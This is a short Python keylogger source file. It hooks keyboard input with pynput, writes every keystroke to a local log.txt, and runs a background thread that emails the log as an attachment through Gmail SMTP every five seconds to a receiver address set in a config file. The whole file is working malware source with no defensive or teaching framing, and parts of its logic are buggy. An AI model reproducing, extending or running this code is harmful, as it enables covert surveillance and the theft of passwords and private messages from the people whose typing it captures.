from pynput import keyboard
from pynput.keyboard import Key
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os.path
from threading import Thread
import time
import config


def send_email():
    while True:
        filename = os.path.basename(file_location)
        attachment = open(file_location, "rb")
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(part)
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        text = msg.as_string()
        server.sendmail(email, send_to_email, text)
        server.quit()
        time.sleep(5)
    
def on_press(key):
    combine_word(key)
    if key == Key.space:
        print("space")
    else:
        print(key.char)
    with open('log.txt', 'r') as f:
        new_leng_of_data = len(f.read())
        print("new len {0}".format(new_leng_of_data))

    # if int(leng_of_data) + 50 < int(new_leng_of_data): 
    with open('length.txt', 'w+') as f:
        f.write(str(new_leng_of_data))
    
            
    

def combine_word(key):
    global word
    if key == Key.space:
       
        word = word + " "
    else:    
        word += str(key.char)
        print("The word is {0}".format(word))
        with open('log.txt', '+a') as f:
            f.writelines(word + '\n')    

if not os.path.isfile('log.txt'):
    f= open("log.txt","w+")
with open('log.txt', 'r') as f:
        leng_of_data = len(f.read())
        if leng_of_data == '':
            leng_of_data = 0
        print("old len {0}".format(leng_of_data))
Thread(target = send_email).start()

    

email = config.sender
password = config.password
send_to_email = config.receiver
subject = 'LOG'
message = '-----------'
file_location = 'C:\\Users\\Elmar\\Desktop\\c3linux\\log.txt'
word = ""

msg = MIMEMultipart()
msg['From'] = email
msg['To'] = send_to_email
msg['Subject'] = subject

msg.attach(MIMEText(message, 'plain'))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()        
listener = keyboard.Listener(on_press=on_press)
listener.start()



    
